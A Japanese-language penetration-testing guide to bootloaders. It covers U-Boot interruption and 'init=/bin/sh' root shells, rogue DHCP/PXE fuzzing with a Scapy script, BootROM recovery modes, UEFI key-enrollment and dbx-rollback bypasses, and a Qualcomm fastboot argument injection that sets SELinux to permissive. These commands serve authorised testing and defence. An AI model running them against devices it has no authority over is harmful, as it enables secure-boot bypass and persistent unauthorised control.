# Bootloaderのテスト

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの起動設定を変更し、U-BootやUEFIクラスのローダーなどのbootloaderをテストする際に推奨されます。早期のコード実行を実現し、署名やロールバックに対する保護を評価し、リカバリーやネットワークブート経路を悪用することに重点を置きます。

関連項目: bl2_extのパッチ適用によるMediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Bootの手早い突破口と環境変数の悪用

1. インタプリタシェルにアクセスする
   - 起動中に、`bootcmd`が実行される前に既知の中断キー（多くの場合、任意のキー、0、スペース、またはボード固有の「magic」シーケンス）を押して、U-Bootプロンプトを表示します。<sup>[[1]](#references)</sup>

2. 起動状態と変数を調べる
   - 便利なコマンド:
     - `printenv`（環境変数を表示）
     - `bdinfo`（ボード情報、メモリアドレス）
     - `help bootm; help booti; help bootz`（サポートされているkernelの起動方法）
     - `help ext4load; help fatload; help tftpboot`（利用可能なローダー）

3. root shellを取得できるようboot引数を変更する
   - `init=/bin/sh`を追加すると、通常のinitの代わりにkernelがシェルを起動します:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP serverからNetbootする
   - ネットワークを設定し、LANからkernel/fit imageを取得する:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 環境経由で変更を永続化する
   - env ストレージが書き込み保護されていなければ、制御を永続化できます:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - フォールバック経路に影響する `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` などの変数を確認します。設定ミスがあると、繰り返し shell に入れる可能性があります。

6. debug/unsafe features を確認する
   - 次の項目を探します: `bootdelay` > 0、`autoboot` が無効、制限のない `usb start; fatload usb 0:1 ...`、シリアル経由で `loady`/`loads` を実行できること、信頼できないメディアからの `env import`、署名チェックなしでロードされる kernels/ramdisks。

7. U-Boot image/verification testing
   - プラットフォームが FIT images による secure/verified boot を謳っている場合、署名なしの image と改ざんした image の両方を試します:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` が存在しない場合や、従来の `verify=n` の動作では、多くの場合、任意の payload を起動できます。
   - 単純な許可／拒否の結果だけで終わらせないでください。最近の FIT 研究では、検証経路自体が pre-auth 攻撃対象領域になり得ることが示されています。外部保存された FIT data（`data-offset`、`data-position`、`data-size`）、署名付き configuration の選択、`loadables`、overlay / `extra-conf` の処理を negative-test してください。
   - 対応する source tree がある場合は、実機に触れる前に `test/vboot/vboot_test.sh` を使うと、U-Boot sandbox で FIT 検証の動作をすばやく再現できます。<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`)、`extlinux`、および script bootflows
   - 最近の U-Boot build では、`bootcmd` は単に Standard Boot を呼び出す wrapper であることがよくあります。つまり、表示されている環境が無害に見えても、書き込み可能な media、PXE、または SPI flash が実際の trust boundary になる可能性があります。
   - `extlinux` bootmeth は `/` および `/boot` 以下の `extlinux/extlinux.conf` を検索します。script bootmeth はまず `boot.scr.uimg` を検索し、次に `boot.scr` を検索します。network boot では、script のファイル名を `boot_script_dhcp` から取得する場合があります。
   - トリアージに役立つコマンド：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - テストするabuse case: `boot_targets`内で優先順位が高い、攻撃者が制御するUSB/SDメディア、書き込み可能な`/boot/extlinux/extlinux.conf`、`boot.scr`を提供するrogue TFTP、または`script_offset_f`経由のSPI-backed script execution。
   - プラットフォームがFIT verificationに依存している場合は、設定がイメージごとだけでなく、configuration levelで署名されていることを確認してください。`required-mode=all`は、必須鍵のいずれか1つを受け入れる方式より強力です。

## Network-boot surface（DHCP/PXE）とrogue servers

9. PXE/DHCP parameter fuzzing
   - U-Bootのlegacy BOOTP/DHCP処理には、メモリ安全性の問題が発生したことがあります。たとえば、CVE‑2024‑42040では、細工したDHCP responseによるメモリ開示が報告されており、U-Bootメモリ内のバイト列がネットワーク上に漏えいする可能性があります。<sup>[[4]](#references)</sup> DHCP/PXEのcode pathに対して、長すぎる値や境界値（option 67のbootfile-name、vendor options、file/servername fields）を使ってテストし、ハングやleakを確認してください。
   - netboot中にboot parameterをストレステストするための最小限のScapy snippet:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - PXE filename fieldsが、OS側のプロビジョニングスクリプトに渡される際、サニタイズされずにshell/loaderのロジックへ渡されるかどうかも検証します。

10. Rogue DHCP serverのcommand injectionテスト
   - rogue DHCP/PXEサービスをセットアップし、filenameまたはoptionsフィールドに文字を注入して、ブートチェーンの後続段階にあるcommand interpreterへ到達できるか試します。MetasploitのDHCP auxiliary、`dnsmasq`、またはカスタムのScapyスクリプトが適しています。まずラボネットワークを隔離してください。

## 通常のブートを上書きするSoC ROMリカバリモード

多くのSoCには、フラッシュイメージが無効でもUSB/UART経由でコードを受け付けるBootROMの「loader」モードがあります。secure-boot fuseが焼き込まれていなければ、ブートチェーンの非常に早い段階で任意のコードを実行できる可能性があります。

- NXP i.MX（Serial Download Mode）
  - ツール: `uuu` (mfgtools3) または `imx-usb-loader`。
  - 例: `imx-usb-loader u-boot.imx` を実行し、カスタムU-BootをRAMに送り込んで実行します。
- Allwinner（FEL）
  - ツール: `sunxi-fel`。
  - 例: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
  - ツール: `rkdeveloptool`。
  - 例: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` を実行してloaderをステージングし、カスタムU-Bootをアップロードします。

デバイスのsecure-boot eFuses/OTPが焼き込まれているかを確認します。焼き込まれていない場合、BootROMのダウンロードモードは多くの場合、最初の段階のpayloadをSRAM/DRAMから直接実行することで、上位レベルの検証（U-Boot、kernel、rootfs）を回避します。

## UEFI/PCクラスのbootloader: 簡易チェック

11. ESPの改ざん、rollback、key enrollmentのテスト
   - EFI System Partition (ESP) をマウントし、loaderコンポーネントを確認します: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、ベンダーのロゴパス。
   - 可能であれば、OSからSecure Bootの状態とkey databaseをダンプします:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - プラットフォームが Setup Mode である場合、認証なしでキー登録を受け付ける場合、またはテスト用／デフォルトの Platform Key（PKfail クラス）が搭載されている場合、ローカル管理者や物理アクセス可能な攻撃者は自身の KEK/db を登録し、Secure Boot が「有効」に見える状態を保ちながら任意の EFI バイナリを起動できます。<sup>[[3]](#references)</sup>
   - Secure Boot の失効情報（dbx）が最新でない場合は、ダウングレードした、または既知の脆弱性がある署名済みブートコンポーネントでの起動を試してください。プラットフォームが古い shim／bootmanager を引き続き信頼していれば、多くの場合、ESP から独自のカーネルや `grub.cfg` を読み込んで永続化できます。
   - Windows では、ファームウェアの `dbx` に `Microsoft Windows Production PCA 2011` の署名者が登録されていない場合、パッチ適用済みのホストでも脆弱な署名済みブートマネージャーを受け入れることがあります。これは BlackX で確認されています。<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 型のバイパスでは攻撃者の MOK を登録でき、正規の shim が後続の起動時にそのキーで署名された EFI ペイロードを読み込めます。<sup>[[12]](#references)[[13]](#references)</sup> 後から古い Windows 署名者を失効させても、登録済みの MOK は削除されないため、その shim が引き続き信頼されていれば shim ベースの経路は永続化する可能性があります。<sup>[[12]](#references)</sup>
   - 許可を得た UEFI マシンでこのロールバック経路をテストする前に、Windows の更新履歴だけでなく、**ファームウェアで実際に有効な失効状態**を確認してください。<sup>[[13]](#references)[[14]](#references)</sup> Microsoft は、`dbx` 内の 2011 署名者を確認するための、読み取り専用の管理者権限 PowerShell コマンドを提供しています。<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False`はあくまで手掛かりです。復旧可能なラボで、具体的な署名済みブートコンポーネントとその他の失効状況を確認してください。<sup>[[12]](#references)[[14]](#references)</sup> 保留中のレジストリ更新や期限切れの署名証明書は、`dbx`の失効が完了したことと同じではありません。<sup>[[13]](#references)[[14]](#references)</sup>

12. 古いshim / SBAT / dbxの失効テスト
   - 失効情報が古い場合、古いMicrosoft署名済みshimやベンダーのフォークは、BYOVD型のbootkit経路として依然機能する可能性があります。隔離されたラボで、過去に脆弱性があったshimをESPに配置し、独自の`grubx64.efi`またはカーネルをchainloadしてみてください。<sup>[[11]](#references)</sup>
   - クイックトリアージ:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - shimが失効リストに含まれているにもかかわらず実行される場合、firmware/OSの`dbx`更新が古いか、上流のSBAT保護を継承していないforkされたloaderを信頼しています。

13. Boot logo parsing bugs（LogoFAILクラス）
   - 複数のOEM/IBV firmwareに、boot logoを処理するDXEの画像パース脆弱性がありました。攻撃者がvendor固有のパス（例：`\EFI\<vendor>\logo\*.bmp`）に細工した画像をESP上へ配置して再起動できる場合、Secure Bootが有効でも、早期ブート中にコード実行される可能性があります。プラットフォームがユーザー提供のlogoを受け入れるか、またOSから該当パスへ書き込めるかをテストしてください。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

QualcommのABLを使って**Generic Bootloader Library (GBL)**をロードするAndroid 16デバイスでは、ABLが`efisp`パーティションからロードするUEFI appを**認証**するかどうかを検証してください。ABLがUEFI appの**存在**だけを確認し、署名を検証しない場合、`efisp`へのwrite primitiveによって、ブート時に**OS起動前の未署名コード実行**が可能になります。<sup>[[6]](#references)[[7]](#references)</sup>

実践的な確認事項と悪用経路：

- **efisp write primitive**：カスタムUEFI appを`efisp`へ書き込む手段が必要です（root/特権サービス、OEM appのバグ、recovery/fastboot経路）。これがなければ、GBLのロード時の欠陥へ直接到達することはできません。<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection**（ABLのバグ）：一部のビルドでは、`fastboot oem set-gpu-preemption`で追加トークンを受け入れ、それらをkernel cmdlineに追加します。これを利用してSELinuxをpermissiveにし、保護されたパーティションへの書き込みを可能にできます：
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  デバイスにパッチが適用されている場合、このコマンドは余分な引数を拒否するはずです。<sup>[[5]](#references)[[6]](#references)</sup>
- **永続フラグによる bootloader unlock**: boot-stage payload は永続的な unlock フラグ（例: `is_unlocked=1`、`is_unlocked_critical=1`）を書き換え、OEM サーバーや承認のゲートを経ずに `fastboot oem unlock` をエミュレートできます。これは次回の再起動後も維持される状態変更です。<sup>[[6]](#references)</sup>

防御・トリアージに関する注意事項:

- ABL が `efisp` からの GBL/UEFI payload に対して署名検証を行うか確認してください。行わない場合、`efisp` は高リスクな永続化攻撃面として扱ってください。
- ABL の fastboot OEM handler にパッチが適用され、**引数の数を検証**して追加トークンを拒否するか確認してください。<sup>[[8]](#references)[[9]](#references)</sup>

## ハードウェアに関する注意

初期ブート中に SPI/NAND flash を操作する際（例: ピンを接地して読み取りを回避する場合）は注意し、必ず flash のデータシートを確認してください。タイミングを誤って短絡させると、デバイスや programmer が破損するおそれがあります。

## 注意事項と追加のヒント

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試すと、環境 blob を RAM とストレージ間で移動できます。プラットフォームによっては、認証なしでリムーバブルメディアから env をインポートできます。
- `extlinux.conf` 経由で起動する Linux ベースのシステムで永続化するには、署名チェックが適用されていない場合、ブートパーティションの `APPEND` 行を変更（`init=/bin/sh` または `rd.break` を挿入）するだけで十分なことがよくあります。
- ターゲットがデュアルスロット / A/B アップデートを使用している場合は、[firmware analysis overview](README.md) の anti-rollback と slot-desync の手法を確認し、bootloader 自体の外部にある updater 限定の信頼性の欠陥を見落とさないようにしてください。
- userland が `fw_printenv/fw_setenv` を提供する場合は、`/etc/fw_env.config` が実際の env ストレージと一致しているか検証してください。オフセットの設定ミスにより、誤った MTD 領域を読み書きする可能性があります。

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAILを発見: システム起動時の画像解析がもたらす危険性](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: 信頼されていない Platform Key が UEFI エコシステムの Secure Boot を損なう](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 の詳細](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: サニタイズされていない2つの文字列を使った Xiaomi の unlock](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL の exploit により、攻撃者が bootloader を unlock 可能](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) のアーキテクチャ](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: 信頼されていない入力が kernel cmdline に伝播する問題を修正](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value コマンドのチェックを追加](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [起動不能: U-Boot の FIT 署名検証を破る](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [脆弱性情報 VU#616257 - Microsoft 署名済み UEFI shim bootloader に Secure Boot bypass の脆弱性](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: 神話が事実と確認される](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus に似た UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot の変更に伴う Windows Boot Manager の失効を管理する方法](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
